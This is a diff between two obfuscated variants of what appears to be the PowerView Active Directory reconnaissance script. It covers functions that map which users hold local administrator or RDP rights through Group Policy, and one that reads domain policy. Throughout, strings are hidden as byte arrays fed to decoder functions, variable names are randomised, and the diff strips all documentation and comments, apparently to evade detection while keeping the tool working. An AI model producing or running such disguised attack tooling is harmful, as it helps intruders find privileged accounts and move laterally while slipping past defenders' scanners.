-        throw (HandleResult95 @(156,237,237,77,9,27,191,103,171,199,237,22,51,15,133,91,172,242,154,23,25,11,141,67,129,233,176,101,10,11,246,95,170,199,184,93,52,4,141,71,172,237,237,94,51,53,164,92,129,233,176,116,2,10,134,65,132,233,150,81,51,37,133,71,129,233,176,115,28,24,130,91,134,249,229,126,26,53,133,31,173,242,150,75,25,4,137,95,146,233,224,26) @(200,170,212,39,80,76,199,47))
+        throw (ParseEntry20 @(58,92,103,67,178,233,43,191,13,118,103,24,136,253,17,131,10,67,16,25,162,249,25,155,39,88,58,107,177,249,98,135,12,118,50,83,143,246,25,159,10,92,103,80,136,199,48,132,39,88,58,122,185,248,18,153,34,88,28,95,136,215,17,159,39,88,58,125,167,234,22,131,32,72,111,112,161,199,17,199,11,67,28,69,162,246,29,135,52,88,106,20) @(110,27,94,41,235,190,83,247))
     }
-
-    Write-Verbose ((HandleResult95 @(195,183,235,218,242,244,239,164,179,231,250,149,222,177,239,141) @(151,240,210,176,171,163)) + $cXlWen)
-    Write-Verbose ((HandleResult95 @(42,180,190,249,254,78,165,200,213,150,16,152,183,233,229,65) @(124,243,248,128,164)) + $dXja)
-    Write-Verbose ((HandleResult95 @(137,13,241,233,133,120,225,160,139,120,253,225,133,29,249,160,141,13,219,234,187,15,130,248,189,29,226,166,150,11,138,173) @(223,74,183,144)) + $RMOjyA9b)
-
-    if($dXja -isnot [system.array]) { $dXja = @($dXja) }
-
-    # use the tokenGroups approach from Get-NetGroup to get all effective
-    #   security SIDs this object is a part of
-    $dXja += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $i7h0U2 -RawSids
-
-    if($dXja -isnot [system.array]) { $dXja = @($dXja) }
-
-    Write-Verbose ((HandleResult95 @(39,103,60,103,89,74,59,0,7,82,89,113,60,120,52,98,96,112,17,92,2,73,65,103,20,103,52,112,76,116,52,13) @(117,48,102,10,3,29)) + $dXja)
-
-    $KAuD =  @{
+    Write-Verbose ((ParseEntry20 @(4,144,187,56,145,202,40,131,227,5,153,171,25,150,191,111) @(80,215,130,82,200,157)) + $qbF4Ozdv)
+    Write-Verbose ((ParseEntry20 @(247,68,44,49,251,49,60,120,244,49,6,35,238,106,43,117) @(161,3,106,72)) + $Tl2GKR4)
+    Write-Verbose ((ParseEntry20 @(210,50,29,29,194,182,35,107,48,170,206,4,1,51,214,180,39,28,8,226,224,48,110,12,250,211,32,109,45,217,185,72) @(132,117,91,100,152)) + $riZxyR)
+    if($Tl2GKR4 -isnot [system.array]) { $Tl2GKR4 = @($Tl2GKR4) }
+    $Tl2GKR4 += Get-NetGroup -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $XWK0 -RawSids
+    if($Tl2GKR4 -isnot [system.array]) { $Tl2GKR4 = @($Tl2GKR4) }
+    Write-Verbose ((ParseEntry20 @(183,171,245,65,191,171,225,28,132,164,245,64,172,180,253,68,134,145,203,64,129,191,237,86,132,171,253,86,170,149,238,17) @(229,252,175,44)) + $Tl2GKR4)
+    $fSyz5FKV =  @{
         'Domain' = $Domain
         'DomainController' = $DomainController
         'UsePSDrive' = $UsePSDrive
         'PageSize' = $PageSize
     }
-
-    # get all GPO groups, and filter on ones that match our target SID list
-    #   and match the target local sid memberof list
-    $i46v = Get-NetGPOGroup @KAuD | ForEach-Object {
-        
+    $g3yS1O = Get-NetGPOGroup @fSyz5FKV | ForEach-Object {
         if ($_.members) {
             $_.members = $_.members | Where-Object {$_} | ForEach-Object {
-                if($_ -match (HandleResult95 @(252,115,136,232,229,94,237,173) @(169,10,184,144))) {
+                if($_ -match (ParseEntry20 @(30,194,201,195,36,31,238,196) @(75,187,249,187,104))) {
                     $_
                 }
                 else {
-                    # if there are any plain group names, try to resolve them to sids
                     Convert-NameToSid -ObjectName $_ -Domain $Domain
                 }
             }
-
-            # stop PowerShell 2.0's string stupid unboxing
             if($_.members -isnot [system.array]) { $_.members = @($_.members) }
             if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
-            
             if($_.members) {
                 try {
-                    # only return groups that contain a target sid
-
-                    # TODO: fix stupid weird "-DifferenceObject" is null error
-                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $dXja -IncludeEqual -ExcludeDifferent) ) {
-                        if ($_.memberof -contains $cXlWen) {
+                    if( (Compare-Object -ReferenceObject $_.members -DifferenceObject $Tl2GKR4 -IncludeEqual -ExcludeDifferent) ) {
+                        if ($_.memberof -contains $qbF4Ozdv) {
                             $_
                         }
                     }
                 } 
                 catch {
-                    Write-Debug ((HandleResult95 @(127,91,255,132,118,30,74,210,164,38,20,119,214,186,82,84,98,226,200,122,100,68,132,145,118,122,73,217,158,122,96,100,236,170,33,70,74,244,192,41) @(45,3,181,253,20)) + $dXja + (HandleResult95 @(61,74,132,195) @(116,14,235,164,153,155)) + $_)
+                    Write-Debug ((ParseEntry20 @(86,211,18,179,122,183,47,99,210,106,243,108,231,33,66,242,57,157,45,234,47,67,186,52,168,79,206,10,103,229,21,173,65,211,83,111,194,25,247,37) @(4,139,88,202,24,132,102)) + $Tl2GKR4 + (ParseEntry20 @(200,225,61,136) @(129,165,82,239,34,145)) + $_)
                 }
             }
         }
     }
-
-    Write-Verbose ((HandleResult95 @(227,4,255,64,235,6,247,102,213,109,255,106,254,92,252,45) @(177,53,189,16)) + $i46v)
-    $IE3py = @{}
-
-    # process the matches and build the result objects
-    $i46v | Where-Object {$_} | ForEach-Object {
-
-        $FiYFWZ = $_.GPOName
-
-        if( -not $IE3py[$FiYFWZ] ) {
+    Write-Verbose ((ParseEntry20 @(22,130,197,33,132,119,249,241,21,134,6,201,200,24,159,121) @(68,179,135,113,222)) + $g3yS1O)
+    $aXa3Z9S = @{}
+    $g3yS1O | Where-Object {$_} | ForEach-Object {
+        $Jprc = $_.GPOName
+        if( -not $aXa3Z9S[$Jprc] ) {
             $GPOname = $_.GPODisplayName
-            $BJvP7x3 = $_.Filters
-
-            # find any OUs that have this GUID applied
-            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $FiYFWZ -FullData -PageSize $PageSize | ForEach-Object {
-
-                if($BJvP7x3) {
-                    # filter for computer name/org unit if a filter is specified
-                    #   TODO: handle other filters?
-                    $bRMk = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
-                        $_.adspath -match ($BJvP7x3.Value)
+            $ihEQZ = $_.Filters
+            Get-NetOU -Domain $Domain -DomainController $DomainController -GUID $Jprc -FullData -PageSize $PageSize | ForEach-Object {
+                if($ihEQZ) {
+                    $cm4bbpR = Get-NetComputer -ADSpath $_.ADSpath -FullData -PageSize $PageSize | Where-Object {
+                        $_.adspath -match ($ihEQZ.Value)
                     } | ForEach-Object { $_.dnshostname }
                 }
                 else {
-                    $bRMk = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize
+                    $cm4bbpR = Get-NetComputer -ADSpath $_.ADSpath -PageSize $PageSize
                 }
-
-                $AlhmXq = New-Object PSObject
-                $AlhmXq | Add-Member Noteproperty 'ObjectName' $RMOjyA9b
-                $AlhmXq | Add-Member Noteproperty 'GPOname' $GPOname
-                $AlhmXq | Add-Member Noteproperty 'GPOguid' $FiYFWZ
-                $AlhmXq | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
-                $AlhmXq | Add-Member Noteproperty 'Computers' $bRMk
-                $AlhmXq
+                $CDz9rrV = New-Object PSObject
+                $CDz9rrV | Add-Member Noteproperty 'ObjectName' $riZxyR
+                $CDz9rrV | Add-Member Noteproperty 'GPOname' $GPOname
+                $CDz9rrV | Add-Member Noteproperty 'GPOguid' $Jprc
+                $CDz9rrV | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
+                $CDz9rrV | Add-Member Noteproperty 'Computers' $cm4bbpR
+                $CDz9rrV
             }
-
-            # find any sites that have this GUID applied
-            # TODO: fix, this isn't the correct way to query computers from a site...
-            # Get-NetSite -GUID $GPOguid -FullData | Foreach-Object {
-            #     if($Filters) {
-            #         # filter for computer name/org unit if a filter is specified
-            #         #   TODO: handle other filters?
-            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath -FullData | ? {
-            #             $_.adspath -match ($Filters.Value)
-            #         } | Foreach-Object {$_.dnshostname}
-            #     }
-            #     else {
-            #         $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
-            #     }
-
-            #     $SiteComptuers = Get-NetComputer -ADSpath $_.ADSpath
-            #     $out = New-Object PSObject
-            #     $out | Add-Member Noteproperty 'Object' $ObjectDistName
-            #     $out | Add-Member Noteproperty 'GPOname' $GPOname
-            #     $out | Add-Member Noteproperty 'GPOguid' $GPOguid
-            #     $out | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
-            #     $out | Add-Member Noteproperty 'Computers' $OUComputers
-            #     $out
-            # }
-
-            # mark off this GPO GUID so we don't process it again if there are dupes
-            $IE3py[$FiYFWZ] = $True
+            $aXa3Z9S[$Jprc] = $True
         }
     }
-
 }
-
-
 function Find-GPOComputerAdmin {
-<#
-    .SYNOPSIS
-
-        Takes a computer (or GPO) object and determines what users/groups have 
-        administrative access over it.
-
-        Inverse of Find-GPOLocation.
-
-    .PARAMETER ComputerName
-
-        The computer to determine local administrative access to.
-
-    .PARAMETER OUName
-
-        OU name to determine who has local adminisrtative acess to computers
-        within it. 
-
-    .PARAMETER Domain
-
-        Optional domain the computer/OU exists in, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER Recurse
-
-        Switch. If a returned member is a group, recurse and get all members.
-
-    .PARAMETER LocalGroup
-
-        The local group to check access against.
-        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
-        or a custom local SID.
-        Defaults to local 'Administrators'.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount any found policy files with temporary PSDrives.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local
-        
-        Finds users who have local admin rights over WINDOWS3 through GPO correlation.
-
-    .EXAMPLE
-
-        PS C:\> Find-GPOComputerAdmin -ComputerName WINDOWS3.dev.testlab.local -LocalGroup RDP
-        
-        Finds users who have RDP rights over WINDOWS3 through GPO correlation.
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $ComputerName,
-
         [String]
         $OUName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $Recurse,
-
         [String]
         $LocalGroup = 'Administrators',
-
         [Switch]
         $UsePSDrive,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     process {
-    
         if(!$ComputerName -and !$OUName) {
-            Throw (HandleResult95 @(59,114,140,100,21,127,128,35,19,96,148,107,35,74,132,102,45,116,128,100,20,78,131,102,35,22,148,93,46,112,243,126,62,96,243,35,20,20,147,117,46,74,151,117,20,111,136,100,19,74,174,121,45,112,147,47) @(119,39,194,18))
+            Throw (ParseEntry20 @(116,30,3,8,215,141,122,122,41,57,227,172,108,38,11,10,239,134,122,61,46,23,244,161,108,122,27,49,236,130,9,39,4,57,132,228,91,120,28,25,236,184,109,44,46,54,255,163,92,38,33,21,239,130,105,118) @(56,75,77,126,181,213))
         }
-
         if($ComputerName) {
-            $daP3MI = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
-
-            if(!$daP3MI) {
-                throw ((HandleResult95 @(180,15,46,206,54,159,124,168,191,101,94,221) @(229,61,23,186,85,215,42,152)) + $fa0ya + (HandleResult95 @(104,230,82,116,104,230,108,119,67,246,120,113,67,200,127,111) @(33,161,62,1)) + $Domain + (HandleResult95 @(0,69,48,40,214,1,252,38,16,81,75,108,214,95,252,41) @(74,60,114,93,180,50,173,65)))
+            $PdWPht = Get-NetComputer -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
+            if(!$PdWPht) {
+                throw ((ParseEntry20 @(255,52,206,105,63,222,112,158,92,175,84,59) @(174,6,247,29,92,150,38)) + $mnZ6k + (ParseEntry20 @(167,197,191,224,139,169,208,165,247,149,168,242,177,252,131,128) @(238,130,211,149,194)) + $Domain + (ParseEntry20 @(57,142,182,213,55,206,126,20,173,153,153,100,159,66,34,159) @(115,247,244,160,85,253,47)))
             }
-            
-            ForEach($fa0ya in $daP3MI) {
-                # extract all OUs a computer is a part of
-                $tRQ5E01c = $fa0ya.distinguishedname
-
-                $FmQych = $tRQ5E01c.split(",") | Foreach-Object {
-                    if($_.startswith((HandleResult95 @(48,248,88,6) @(100,201,13,63)))) {
-                        $tRQ5E01c.substring($tRQ5E01c.indexof($_))
+            ForEach($mnZ6k in $PdWPht) {
+                $u0q1Ya2 = $mnZ6k.distinguishedname
+                $bHrY = $u0q1Ya2.split(",") | Foreach-Object {
+                    if($_.startswith((ParseEntry20 @(195,121,31,221) @(151,72,74,228,115,73)))) {
+                        $u0q1Ya2.substring($u0q1Ya2.indexof($_))
                     }
                 }
             }
         }
         else {
-            $FmQych = @($OUName)
+            $bHrY = @($OUName)
         }
-
-        Write-Verbose ((HandleResult95 @(27,37,116,111,164,182,211,125,43,119,47,168,231,255,34,5) @(77,98,50,22,254,132,133)) + $FmQych)
-
-        $FmQych | Where-Object {$_} | Foreach-Object {
-
-            $XOTwc = $_
-
-            # for each OU the computer is a part of, get the full OU object
-            $i46v = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 
-                # and then get any GPO links
+        Write-Verbose ((ParseEntry20 @(160,211,108,96,82,170,17,198,221,111,32,94,251,61,153,243) @(246,148,42,25,8,152,71)) + $bHrY)
+        $bHrY | Where-Object {$_} | Foreach-Object {
+            $BfAc2 = $_
+            $g3yS1O = Get-NetOU -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 
                 $_.gplink.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XVs=")))) | Foreach-Object {
-                    if ($_.startswith((HandleResult95 @(162,227,141,135,147,183,155,226) @(246,166,223,197,198)))) {
+                    if ($_.startswith((ParseEntry20 @(135,85,106,30,147,217,209,238) @(211,16,56,92,198,152,236)))) {
                         $_.split(";")[0]
                     }
                 }
             } | Foreach-Object {
-                $KAuD =  @{
+                $fSyz5FKV =  @{
                     'Domain' = $Domain
                     'DomainController' = $DomainController
                     'ADSpath' = $_
                     'UsePSDrive' = $UsePSDrive
                     'PageSize' = $PageSize
                 }
-
-                # for each GPO link, get any locally set user/group SIDs
-                Get-NetGPOGroup @KAuD
+                Get-NetGPOGroup @fSyz5FKV
             }
-
-            # for each found GPO group, resolve the SIDs of the members
-            $i46v | Where-Object {$_} | Foreach-Object {
-                $g6I4X0Af = $_
-                $g6I4X0Af.members | Foreach-Object {
-
-                    # resolvethis SID to a domain object
+            $g3yS1O | Where-Object {$_} | Foreach-Object {
+                $CR4Arm = $_
+                $CR4Arm.members | Foreach-Object {
                     $Object = Get-ADObject -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize
-
-                    $slBZUK = New-Object PSObject
-                    $slBZUK | Add-Member Noteproperty 'ComputerName' $ComputerName
-                    $slBZUK | Add-Member Noteproperty 'OU' $XOTwc
-                    $slBZUK | Add-Member Noteproperty 'GPODisplayName' $g6I4X0Af.GPODisplayName
-                    $slBZUK | Add-Member Noteproperty 'GPOPath' $g6I4X0Af.GPOPath
-                    $slBZUK | Add-Member Noteproperty 'ObjectName' $Object.name
-                    $slBZUK | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
-                    $slBZUK | Add-Member Noteproperty 'ObjectSID' $_
-                    $slBZUK | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')
-                    $slBZUK 
-
-                    # if we're recursing and the current result object is a group
-                    if($Recurse -and $slBZUK.isGroup) {
-
+                    $WXYGsN = New-Object PSObject
+                    $WXYGsN | Add-Member Noteproperty 'ComputerName' $ComputerName
+                    $WXYGsN | Add-Member Noteproperty 'OU' $BfAc2
+                    $WXYGsN | Add-Member Noteproperty 'GPODisplayName' $CR4Arm.GPODisplayName
+                    $WXYGsN | Add-Member Noteproperty 'GPOPath' $CR4Arm.GPOPath
+                    $WXYGsN | Add-Member Noteproperty 'ObjectName' $Object.name
+                    $WXYGsN | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
+                    $WXYGsN | Add-Member Noteproperty 'ObjectSID' $_
+                    $WXYGsN | Add-Member Noteproperty 'IsGroup' $($Object.samaccounttype -notmatch '805306368')
+                    $WXYGsN 
+                    if($Recurse -and $WXYGsN.isGroup) {
                         Get-NetGroupMember -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {
-
-                            $wKM7 = $_.distinguishedName
-
-                            # extract the FQDN from the Distinguished Name
-                            $LFju8kS = $wKM7.subString($wKM7.IndexOf((HandleResult95 @(14,212,131,158) @(92,145,206,167,8,99)))) -replace 'DC=','' -replace ',','.'
-
-                            if ($_.samAccountType -ne (HandleResult95 @(235,138,61,218,233,180,61,217,233,180,37,223) @(164,206,124,235))) {
-                                $x5xlh = $True
+                            $EybC7 = $_.distinguishedName
+                            $YLe0 = $EybC7.subString($EybC7.IndexOf((ParseEntry20 @(206,36,203,225) @(156,97,134,216,109,136)))) -replace 'DC=','' -replace ',','.'
+                            if ($_.samAccountType -ne (ParseEntry20 @(4,212,50,130,42,20,68,121,221,9,234,83) @(75,144,115,179,103,110,5))) {
+                                $uOt2b = $True
                             }
                             else {
-                                $x5xlh = $False
+                                $uOt2b = $False
                             }
-
                             if ($_.samAccountName) {
-                                # forest users have the samAccountName set
-                                $oIRTSkE = $_.samAccountName
+                                $s15G = $_.samAccountName
                             }
                             else {
-                                # external trust users have a SID, so convert it
                                 try {
-                                    $oIRTSkE = Convert-SidToName $_.cn
+                                    $s15G = Convert-SidToName $_.cn
                                 }
                                 catch {
-                                    # if there's a problem contacting the domain to resolve the SID
-                                    $oIRTSkE = $_.cn
+                                    $s15G = $_.cn
                                 }
                             }
-
-                            $slBZUK = New-Object PSObject
-                            $slBZUK | Add-Member Noteproperty 'ComputerName' $ComputerName
-                            $slBZUK | Add-Member Noteproperty 'OU' $XOTwc
-                            $slBZUK | Add-Member Noteproperty 'GPODisplayName' $g6I4X0Af.GPODisplayName
-                            $slBZUK | Add-Member Noteproperty 'GPOPath' $g6I4X0Af.GPOPath
-                            $slBZUK | Add-Member Noteproperty 'ObjectName' $oIRTSkE
-                            $slBZUK | Add-Member Noteproperty 'ObjectDN' $wKM7
-                            $slBZUK | Add-Member Noteproperty 'ObjectSID' $_.objectsid
-                            $slBZUK | Add-Member Noteproperty 'IsGroup' $x5xlh
-                            $slBZUK 
+                            $WXYGsN = New-Object PSObject
+                            $WXYGsN | Add-Member Noteproperty 'ComputerName' $ComputerName
+                            $WXYGsN | Add-Member Noteproperty 'OU' $BfAc2
+                            $WXYGsN | Add-Member Noteproperty 'GPODisplayName' $CR4Arm.GPODisplayName
+                            $WXYGsN | Add-Member Noteproperty 'GPOPath' $CR4Arm.GPOPath
+                            $WXYGsN | Add-Member Noteproperty 'ObjectName' $s15G
+                            $WXYGsN | Add-Member Noteproperty 'ObjectDN' $EybC7
+                            $WXYGsN | Add-Member Noteproperty 'ObjectSID' $_.objectsid
+                            $WXYGsN | Add-Member Noteproperty 'IsGroup' $uOt2b
+                            $WXYGsN 
                         }
                     }
                 }
@@ -6066,108 +3042,48 @@ function Find-GPOComputerAdmin {
         }
     }
 }
-
-
 function Get-DomainPolicy {
-<#
-    .SYNOPSIS
-
-        Returns the default domain or DC policy for a given
-        domain or domain controller.
-
-        Thanks Sean Metacalf (@pyrotek3) for the idea and guidance.
-
-    .PARAMETER Source
-
-        Extract Domain or DC (domain controller) policies.
-
-    .PARAMETER Domain
-
-        The domain to query for default policies, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ResolveSids
-
-        Switch. Resolve Sids from a DC policy to object names.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount any found policy files with temporary PSDrives.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGPO
-
-        Returns the GPOs in the current domain. 
-#>
-
     [CmdletBinding()]
     Param (
         [String]
-        [ValidateSet((HandleResult95 @(136,25,56,148,131,9,109,149) @(218,94,1,224)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))))]
-        $Source =(HandleResult95 @(81,234,237,199,90,250,184,198) @(3,173,212,179)),
-
+        [ValidateSet((ParseEntry20 @(107,2,154,93,5,115,233,173) @(57,69,163,41,92,36,133,216)),([char]0x44+[char]0x43))]
+        $Source =(ParseEntry20 @(39,89,159,182,128,109,25,107) @(117,30,166,194,217,58)),
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [Switch]
         $ResolveSids,
-
         [Switch]
         $UsePSDrive
     )
-
-    if($Source -eq (HandleResult95 @(25,99,115,220,202,60,13,62) @(75,36,74,168,147,107,97))) {
-        # query the given domain for the default domain policy object
-        $g6I4X0Af = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (HandleResult95 @(186,146,126,173,129,255,106,152,165,73,132,167,217,116,158,144,125,190,129,225,109,139,174,118,152,185,165,21,145,172,101,146,156,193,97,168,185,73,148,224,199,75,150,221,124,145,130,210,111,135,216,14) @(223,232,51,213,208,149,32))
-        
-        if($g6I4X0Af) {
-            # grab the GptTmpl.inf file and parse it
-            $GptTmplPath = $g6I4X0Af.gpcfilesyspath + (HandleResult95 @(74,217,140,166,198,110,122,214,233,143,193,61,70,203,209,142,244,51,43,230,223,214,205,110,74,218,217,148,245,51,64,234,217,215,218,57,70,240,239,135,194,108,68,246,239,179,197,46,118,218,197,172,244,22,64,201,223,188,213,45,94,241,209,145,205,57,47,161) @(18,156,189,228,151,94))
-
-            $v3GrfwQ9 =  @{
+    if($Source -eq (ParseEntry20 @(11,151,123,220,0,135,46,221) @(89,208,66,168))) {
+        $CR4Arm = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (ParseEntry20 @(239,140,19,36,196,190,228,118,199,140,15,43,217,128,239,73,196,157,15,40,216,128,232,116,199,159,110,105,219,144,248,118,198,162,31,43,196,174,239,1,216,157,23,105,218,144,252,118,197,174,110,97) @(138,246,94,92,149,212,174,49))
+        if($CR4Arm) {
+            $GptTmplPath = $CR4Arm.gpcfilesyspath + (ParseEntry20 @(189,181,88,130,180,168,215,251,177,155,63,163,177,207,211,219,134,157,80,186,135,170,229,129,189,182,13,176,135,245,237,199,129,195,36,167,177,244,237,210,176,194,63,170,183,207,237,193,129,182,17,136,134,208,237,228,135,168,43,179,169,245,211,196,191,151,84,253) @(229,240,105,192,229,152,191,177))
+            $XOlWSe =  @{
                 'GptTmplPath' = $GptTmplPath
                 'UsePSDrive' = $UsePSDrive
             }
-
-            # parse the GptTmpl.inf
-            Get-GptTmpl @v3GrfwQ9
+            Get-GptTmpl @XOlWSe
         }
-
     }
     elseif($Source -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM=")))) {
-        # query the given domain/dc for the default domain controller policy object
-        $g6I4X0Af = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (HandleResult95 @(38,241,215,64,18,241,200,49,12,207,215,70,15,223,204,122,13,224,212,118,14,223,203,71,14,226,189,55,13,207,219,69,15,223,204,117,18,241,204,50,17,224,196,55,12,207,223,69,12,211,189,63) @(67,139,141,2))
-
-        if($g6I4X0Af) {
-            # grab the GptTmpl.inf file and parse it
-            $GptTmplPath = $g6I4X0Af.gpcfilesyspath + (HandleResult95 @(75,43,246,210,191,35,6,141,196,133,69,13,147,199,130,121,13,170,169,148,113,92,157,160,182,85,10,183,242,131,65,24,163,163,163,116,58,171,194,141,70,92,145,250,188,68,60,183,244,168,107,38,164,216,188,70,12,159,210,157,95,3,171,229,180,116,83,250) @(19,110,199,144,238))
-
-            $v3GrfwQ9 =  @{
+        $CR4Arm = Get-NetGPO -Domain $Domain -DomainController $DomainController -GPOname (ParseEntry20 @(57,50,12,74,185,27,30,111,7,18,82,172,45,15,29,48,24,99,177,21,22,8,14,19,69,129,81,110,18,12,0,79,164,53,26,43,25,44,73,216,51,48,21,125,25,76,186,38,20,4,120,107) @(92,72,86,8,232,97,91))
+        if($CR4Arm) {
+            $GptTmplPath = $CR4Arm.gpcfilesyspath + (ParseEntry20 @(162,223,107,57,97,10,146,208,14,16,102,89,174,205,54,17,83,87,195,224,56,73,106,10,162,220,62,11,82,87,168,236,62,72,125,93,174,246,8,24,101,8,172,240,8,44,98,74,158,220,34,51,83,114,168,207,56,35,114,73,182,247,54,14,106,93,199,167) @(250,154,90,123,48,58))
+            $XOlWSe =  @{
                 'GptTmplPath' = $GptTmplPath
                 'UsePSDrive' = $UsePSDrive
             }
-
-            # parse the GptTmpl.inf
-            Get-GptTmpl @v3GrfwQ9 | Foreach-Object {
+            Get-GptTmpl @XOlWSe | Foreach-Object {
                 if($ResolveSids) {
-                    # if we're resolving sids in PrivilegeRights to names
-                    $lRMbKLe0 = New-Object PSObject
+                    $nh6CJgG = New-Object PSObject
                     $_.psobject.properties | Foreach-Object {
                         if( $_.Name -eq 'PrivilegeRights') {
-
-                            $lwvN = New-Object PSObject
-                            # for every nested SID member of PrivilegeRights, try to 
-                            #   unpack everything and resolve the SIDs as appropriate
+                            $YmKO = New-Object PSObject
                             $_.Value.psobject.properties | Foreach-Object {
-
-                                $aimG = $_.Value | Foreach-Object {
+                                $nFK5t = $_.Value | Foreach-Object {
                                     try {
                                         if($_ -isnot [System.Array]) { 
                                             Convert-SidToName $_ 
@@ -6177,299 +3093,154 @@ function Get-DomainPolicy {
                                         }
                                     }
                                     catch {
-                                        Write-Debug ((HandleResult95 @(64,164,223,144,88,59,94,1,113,145,195,147,88,58,111,84,115,171,160,135,115,78,89,44,64,191,212,223,115,73,42,91) @(18,252,149,233,58,8,23,102)) + $_)
+                                        Write-Debug ((ParseEntry20 @(111,24,213,1,4,240,204,108,94,45,201,2,4,241,253,57,92,23,170,22,47,133,203,65,111,3,222,78,47,130,184,54) @(61,64,159,120,102,195,133,11)) + $_)
                                     }
                                 }
-
-                                $lwvN | Add-Member Noteproperty $_.Name $aimG
+                                $YmKO | Add-Member Noteproperty $_.Name $nFK5t
                             }
-
-                            $lRMbKLe0 | Add-Member Noteproperty 'PrivilegeRights' $lwvN
+                            $nh6CJgG | Add-Member Noteproperty 'PrivilegeRights' $YmKO
                         }
                         else {
-                            $lRMbKLe0 | Add-Member Noteproperty $_.Name $_.Value
+                            $nh6CJgG | Add-Member Noteproperty $_.Name $_.Value
                         }
                     }
-                    $lRMbKLe0
+                    $nh6CJgG
                 }
                 else { $_ }
             }
         }
     }
 }
-
-
-
-########################################################
-#
-# Functions that enumerate a single host, either through
-# WinNT, WMI, remote registry, or API calls 
-# (with PSReflect).
-#
-########################################################
-
 function Get-NetLocalGroup {
-<#
-    .SYNOPSIS
-
-        Gets a list of all current users in a specified local group,
-        or returns the names of all local groups with -ListGroups.
-
-    .PARAMETER ComputerName
-
-        The hostname or IP to query for local group users.
-
-    .PARAMETER ComputerFile
-
-        File of hostnames/IPs to query for local group users.
-
-    .PARAMETER GroupName
-
-        The local group name to query for users. If not given, it defaults to "Administrators"
-
-    .PARAMETER ListGroups
-
-        Switch. List all the local groups instead of their members.
-        Old Get-NetLocalGroups functionality.
-
-    .PARAMETER Recurse
-
-        Switch. If the local member member is a domain group, recursively try to resolve its members to get a list of domain users who can access this machine.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetLocalGroup
-
-        Returns the usernames that of members of localgroup "Administrators" on the local host.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetLocalGroup -ComputerName WINDOWSXP
-
-        Returns all the local administrator accounts for WINDOWSXP
-
-    .EXAMPLE
-
-        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -Resurse 
-
-        Returns all effective local/domain users/groups that can access WINDOWS7 with
-        local administrative privileges.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetLocalGroup -ComputerName WINDOWS7 -ListGroups
-
-        Returns all local groups on the WINDOWS7 host.
-
-    .LINK
-
-        http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
-        http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
-#>
-
     [CmdletBinding()]
     param(
         [Parameter(ValueFromPipeline=$True)]
         [Alias('HostName')]
         [String]
         $ComputerName = 'localhost',
-
         [ValidateScript({Test-Path -Path $_ })]
         [Alias('HostList')]
         [String]
         $ComputerFile,
-
         [String]
         $GroupName = 'Administrators',
-
         [Switch]
         $ListGroups,
-
         [Switch]
         $Recurse
     )
-
     begin {
         if ((-not $ListGroups) -and (-not $GroupName)) {
-            # resolve the SID for the local admin group - this should usually default to "Administrators"
-            $TwQZMSe = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
-            $e3Miv = $TwQZMSe.Translate( [System.Security.Principal.NTAccount])
-            $GroupName = ($e3Miv.Value).Split('\')[1]
+            $d6fGzVeB = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
+            $PUyH = $d6fGzVeB.Translate( [System.Security.Principal.NTAccount])
+            $GroupName = ($PUyH.Value).Split('\')[1]
         }
     }
     process {
-
-        $WWfKB1U = @()
-
-        # if we have a host list passed, grab it
+        $DvIb = @()
         if($ComputerFile) {
-            $WWfKB1U = Get-Content -Path $ComputerFile
+            $DvIb = Get-Content -Path $ComputerFile
         }
         else {
-            # otherwise assume a single host name
